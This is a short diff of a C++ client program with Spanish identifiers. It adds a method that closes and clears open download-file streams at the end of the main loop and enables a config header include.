@@ -10,7 +10,7 @@
 #include "mod_escaner.hpp"
 #include "misc.hpp"
 
-//#include "config.hpp"
+#include "config.hpp"
 
 template<typename OBJ>
 void DeleteObj(OBJ*& _obj) {
@@ -182,6 +182,16 @@ void Cliente::DestroyClasses() {
 #endif
  
     __DBG_("[DC] Clases destruidas");
+}
+
+void Cliente::CerrarArchivos() {
+    std::unique_lock<std::mutex> lock(this->mtx_map_archivos);
+    for (auto& archivo : this->map_Archivos_Descarga) {
+        if (archivo.second.ssOutfile.get()->is_open()) {
+            archivo.second.ssOutfile.get()->close();
+        }
+    }
+    this->map_Archivos_Descarga.erase(this->map_Archivos_Descarga.begin(), this->map_Archivos_Descarga.end());
 }
 
 //Kill swith
@@ -1382,7 +1392,7 @@ void Cliente::MainLoop() {
     }
 
     this->DestroyClasses();
-
+    this->CerrarArchivos();
 }
 
 void Cliente::iniPacket() {
